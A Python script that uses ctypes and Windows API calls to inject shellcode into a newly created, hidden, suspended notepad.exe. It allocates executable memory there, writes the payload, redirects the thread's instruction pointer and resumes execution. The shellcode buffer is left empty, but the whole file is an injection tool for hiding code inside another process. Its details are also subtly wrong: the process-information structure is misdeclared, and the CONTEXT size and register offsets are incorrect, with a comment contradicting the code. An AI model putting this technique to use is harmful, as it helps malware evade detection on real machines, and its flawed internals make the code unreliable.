import ctypes
import subprocess
from ctypes import wintypes

# Define necessary Windows constants
PROCESS_ALL_ACCESS = 0x1F0FFF
CREATE_SUSPENDED = 0x00000004
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

# Define the shellcode to be executed
# Leave this portion blank for now
shellcode = bytearray(
    b""
)

# Start the target process in suspended mode
target_process = "notepad.exe"
startup_info = subprocess.STARTUPINFO()
startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
startup_info.wShowWindow = subprocess.SW_HIDE

process_info = subprocess.STARTUPINFO()

# Use CreateProcess to start the target process in suspended mode
success = ctypes.windll.kernel32.CreateProcessW(
    ctypes.c_wchar_p(target_process),
    None,
    None,
    None,
    False,
    CREATE_SUSPENDED,
    None,
    None,
    ctypes.byref(startup_info),
    ctypes.byref(process_info)
)

if not success:
    print("Failed to create the process.")
    exit(1)

# Get the handle to the process and its primary thread
h_process = process_info.hProcess
h_thread = process_info.hThread

# Allocate memory for the shellcode in the target process
shellcode_size = len(shellcode)
base_address = ctypes.windll.kernel32.VirtualAllocEx(
    h_process,
    None,
    shellcode_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
)

if not base_address:
    print("Failed to allocate memory in the target process.")
    ctypes.windll.kernel32.TerminateProcess(h_process, 1)
    exit(1)

# Write the shellcode to the allocated memory in the target process
written = ctypes.c_size_t(0)
success = ctypes.windll.kernel32.WriteProcessMemory(
    h_process,
    base_address,
    ctypes.byref(ctypes.create_string_buffer(shellcode)),
    shellcode_size,
    ctypes.byref(written)
)

if not success or written.value != shellcode_size:
    print("Failed to write shellcode to the target process.")
    ctypes.windll.kernel32.TerminateProcess(h_process, 1)
    exit(1)

# Modify the entry point of the target process to point to the shellcode
context = ctypes.create_string_buffer(716)  # Size of CONTEXT structure on x86/x64
ctypes.memset(context, 0, ctypes.sizeof(context))

# Set the ContextFlags member to CONTEXT_FULL (0x10007) to retrieve all registers
context[0:4] = (0x10007).to_bytes(4, byteorder='little')

# Get the thread context of the suspended thread
if not ctypes.windll.kernel32.GetThreadContext(h_thread, context):
    print("Failed to get thread context.")
    ctypes.windll.kernel32.TerminateProcess(h_process, 1)
    exit(1)

# Update the EIP/RIP register to point to the shellcode
# On x86, EIP is at offset 0xB8, on x64, RIP is at offset 0x80
import struct
if ctypes.sizeof(ctypes.c_void_p) == 8:  # x64
    context[136:144] = struct.pack('<Q', base_address)  # RIP
else:  # x86
    context[184:188] = struct.pack('<I', base_address)  # EIP

# Set the updated thread context
if not ctypes.windll.kernel32.SetThreadContext(h_thread, context):
    print("Failed to set thread context.")
    ctypes.windll.kernel32.TerminateProcess(h_process, 1)
    exit(1)

# Resume the suspended thread to execute the shellcode
if ctypes.windll.kernel32.ResumeThread(h_thread) == -1:
    print("Failed to resume the thread.")
    ctypes.windll.kernel32.TerminateProcess(h_process, 1)
    exit(1)

print("Shellcode executed successfully.")
